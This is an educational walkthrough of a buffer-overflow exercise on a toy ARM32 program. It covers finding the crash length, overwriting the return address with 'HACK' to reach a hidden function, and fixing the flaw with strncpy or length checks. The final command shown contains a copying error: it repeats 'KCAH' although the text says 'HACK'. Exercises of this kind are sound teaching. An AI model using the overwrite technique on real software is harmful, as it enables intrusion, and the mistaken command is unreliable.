# Problem 2 Walkthroug

## Part A

First determine what architecture you want to run the program on. If it's not an ARM32 machine you should use the run\_qemu.sh script. This runs the compiled program in qemu-user mode. Otherwise just run the demo program.

We start by running our program with some string as a first argument.

```sh
  user@host$ ./demo AAAA
  Hello to the string consumer 3000!
  You provided me a string! Yum!
```

It's a good start, but it's not what we want. We want to crash the program. So we start putting in a really long string.

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAAAAAA
  Hello to the string consumer 3000!
  You provided me a string! Yum!
  ------------------------ERROR-------------------------
  Goodbye cruel world! I was a young program. And I have died too soon!
  You can avenge my death! I received Signal Number 11
  Looks like I was near address 0x41414140 at my untimely demise.
  Aborted (core dumped)
```

Great. We crashed the program and if we look closely our input is in the program counter. Now the problem asks us to find the minimum length so we run the program with progressively fewer characters until it doesn't crash. It doesn't crash when our length is 15 so our minimum length to crash is 16 characters.

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAA
  Hello to the string consumer 3000!
  You provided me a string! Yum!
  ------------------------ERROR-------------------------
  Goodbye cruel world! I was a young program. And I have died too soon!
  You can avenge my death! I received Signal Number 4
  Looks like I was near address 0xff6bef44 at my untimely demise.
  Aborted (core dumped)
```

## Part B

So we know that our string impacts our return address, that we want to jump to 0x4b434148, and we need a string of length 15 in front of our string.

At this you can experiment like above and see how As turn into 0x41 in the following example and see how their characters are being parsed into the return address.

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAAAAAA
  Hello to the string consumer 3000!
  You provided me a string! Yum!
  ------------------------ERROR-------------------------
  Goodbye cruel world! I was a young program. And I have died too soon!
  You can avenge my death! I received Signal Number 11
  Looks like I was near address 0x41414140 at my untimely demise.
  Aborted (core dumped)
```

In order to change 0x4b434148 into our string we change the bytes into character and see that the characters correspond to the string 'KCAH'. If we append this to our string with a precursor of 15 bytes we see:

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAKCAH
  Hello to the string consumer 3000!
  You provided me a string! Yum!
  ------------------------ERROR-------------------------
  Goodbye cruel world! I was a young program. And I have died too soon!
  You can avenge my death! I received Signal Number 11
  Looks like I was near address 0x484142 at my untimely demise.
  Aborted (core dumped)
```

It's not quite right. We notice that this address has a 0 as its first octet and realize we should add another character to the start (16 bytes).

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAAKCAH
  Hello to the string consumer 3000!
  You provided me a string! Yum!
  ------------------------ERROR-------------------------
  Goodbye cruel world! I was a young program. And I have died too soon!
  You can avenge my death! I received Signal Number 11
  Looks like I was near address 0x4841434a at my untimely demise.
  Aborted (core dumped)
```

Looking at this result we see that we now have a full address, but the values are wrong. They're backwards! We change our string at the end from 'KCAH' to 'HACK' and try again.

```sh
  user@host$ ./demo AAAAAAAAAAAAAAAAKCAH
  Hello to the string consumer 3000!
  You provided me a string! Yum!
    _____
   /     \
  | () () |
   \  ^  /
    |||||
    |||||

  Oh no! There's haxx0rs in the mainframe!

```

And we won. We made it to the correct function. Celebrate your success and write down the correct result.

## Part C

Part C is a bit more open ended than the previous problems. We need to think about how the buffer is of a limited size and how our strcpy does not check the output or end after a certain point.

Valid solutions to this could be checking the length of the string or otherwise using a more protected function like strncpy which takes the length of the buffer.
